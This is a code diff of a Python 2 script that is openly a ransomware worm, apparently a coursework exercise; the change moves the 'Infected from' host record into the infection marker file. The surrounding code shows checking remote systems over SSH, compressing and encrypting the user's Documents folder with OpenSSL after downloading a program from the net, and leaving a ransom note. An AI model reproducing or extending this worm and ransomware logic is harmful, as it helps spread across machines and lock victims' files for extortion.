@@ -100,12 +100,15 @@ def isRemoteSystemInfected(sshClient):
 #===============================================================================
 # Function to mark the system
 # This function will get call to mark the system
+# @param inFile - The Name of the Input file
+# @param msg - The optional message to write to the marker file
 # @return - N/A
 #===============================================================================
-def markSystem(inFile):
+def markSystem(inFile, msg = None):
     try:
         fileObj = open(inFile, "w")
-        fileObj.write("")
+        if msg:
+            fileObj.write(msg)
         fileObj.close()
     except IOError as e:
         print "markSystem function:"
@@ -114,10 +117,15 @@ def markSystem(inFile):
 
 #===============================================================================
 # Function to mark the system as infected
+# @param fromHost - The Host that the system was infected from
 # @return - N/A
 #===============================================================================
-def markSystemAsInfected():
-    markSystem(INFECTED_MARKER_FILE)
+def markSystemAsInfected(fromHost = None):
+    msg = None
+    if fromHost:
+        msg = "Infected from " + fromHost
+
+    markSystem(INFECTED_MARKER_FILE, msg)
     print "System marked as infected"
 
 #===============================================================================
@@ -415,20 +423,11 @@ def leaveRansomNote(tarName):
 
 #===============================================================================
 # Perform malicious action
-# @param fromHost - Spread from Host
 #===============================================================================
-def performMalicious(fromHost):
+def performMalicious():
     # Compress the user Documents directory
     docDir = os.path.expanduser("~") + "/Documents"
     encryptedFile = None
-    # Mark the same thing as replicator worm
-    try:
-        outFile = open("/tmp/.attackedFrom.txt", "w")
-        outFile.write("System was attacked from " + fromHost)
-        outFile.close()
-    except IOError as msg:
-        print "performMalicious function:"
-        print msg
 
     # Do the actual malicious acts
     if downloadProgramFromNet() and os.path.exists(OPENSSL):
@@ -461,10 +460,10 @@ if __name__ == "__main__":
         else:
             # Otherwise we perform some malicious action
             fromHost = sys.argv[1]
-            performMalicious(fromHost)
+            performMalicious()
 
             # Then mark the system as infected
-            markSystemAsInfected()
+            markSystemAsInfected(fromHost)
     else:
         # If we are running with another argument, then first
         # mark the system as master
